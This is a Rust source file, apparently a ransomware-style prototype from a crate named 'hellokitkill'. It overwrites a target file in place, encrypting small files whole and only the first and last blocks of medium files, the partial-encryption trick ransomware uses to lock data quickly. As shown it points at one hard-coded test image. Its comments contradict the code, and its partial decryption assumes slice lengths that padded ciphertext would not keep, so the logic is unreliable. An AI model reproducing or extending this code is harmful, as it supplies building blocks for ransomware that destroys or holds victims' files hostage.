extern crate hellokitkill;
use std::fs;

use crate::hellokitkill::helpers::*;

fn main() {
    utils::UTILS::show_ascii();

    let file_path = "dev/test.jpg";

    // check if args --decrypt or --encrypt
    let args: Vec<String> = std::env::args().collect();

    if args.contains(&String::from("--help")) {
        println!("Usage: {} [--encrypt | --decrypt]", args[0]);
        println!("Example: {} --encrypt", args[0]);
        println!("Example: {} --decrypt", args[0]);
        std::process::exit(0);
    } else if args.contains(&String::from("--encrypt")) {
        encrypt_p1(file_path);
    } else if args.contains(&String::from("--decrypt")) {
        decrypt_p1(file_path);
    }

}


fn encrypt_p1(file_path:&str) {
    // only encrypt:
    // - first 1024 blocks
    // - last 1024 blocks
    // - logic 1024 blocks

    let metadata = fs::metadata(file_path).unwrap();

    match metadata.len() {
        0 => {
            return;
        },
        len if len < 16 * 1024 => {
            println!("File is too small to encrypt, skipping.");
            return;
        },
        // check if file is < 1mb -> full encrypt
        len if len < 1024 * 1024 => {
            let file = fs::read(file_path).unwrap();
            let encrypted_file = crypto::CRYPTO::encrypt(file);
            fs::write(format!("{}", file_path), encrypted_file).unwrap();
            return;
        },
        // check if file is < 10mb -> encrypt first and last 512 blocks
        len if len < 10 * 1024 * 1024 => {
            let file = fs::read(file_path).unwrap();
            let size = file.len() / 16;
            let first_part = &file[0..512 * 16];
            let last_part = &file[file.len() - 512 * 16..];
            let encrypted_first = crypto::CRYPTO::encrypt(first_part.to_vec());
            let encrypted_last = crypto::CRYPTO::encrypt(last_part.to_vec());
            let mut encrypted_file = Vec::new();
            encrypted_file.extend_from_slice(&encrypted_first);
            encrypted_file.extend_from_slice(&file[512 * 16..file.len() - 512 * 16]);
            encrypted_file.extend_from_slice(&encrypted_last);
            fs::write(format!("{}", file_path), encrypted_file).unwrap();
            return;
        },
        _ => {
            println!("File size: {} bytes", metadata.len());
        }
    }
}

fn decrypt_p1(file_path:&str) {
    // only decrypt:
    // - first 1024 blocks
    // - last 1024 blocks
    // - logic 1024 blocks

    let metadata = fs::metadata(file_path).unwrap();

    match metadata.len() {
        0 => {
            return;
        },
        len if len < 16 * 1024 => {
            println!("File is too small to decrypt, skipping.");
            return;
        },
        len if len < 1024 * 1024 => {
            let file = fs::read(file_path).unwrap();
            let decrypted_file = crypto::CRYPTO::decrypt(file);
            fs::write(format!("{}", file_path), decrypted_file).unwrap();
            return;
        },
        len if len < 10 * 1024 * 1024 => {
            let file = fs::read(file_path).unwrap();
            let size = file.len() / 16;
            let first_part = &file[0..512 * 16];
            let last_part = &file[file.len() - 512 * 16..];
            let decrypted_first = crypto::CRYPTO::decrypt(first_part.to_vec());
            let decrypted_last = crypto::CRYPTO::decrypt(last_part.to_vec());
            let mut decrypted_file = Vec::new();
            decrypted_file.extend_from_slice(&decrypted_first);
            decrypted_file.extend_from_slice(&file[512 * 16..file.len() - 512 * 16]);
            decrypted_file.extend_from_slice(&decrypted_last);
            fs::write(format!("{}", file_path), decrypted_file).unwrap();
            return;
        },
        _ => {
            println!("File size: {} bytes", metadata.len());
        }
    }
}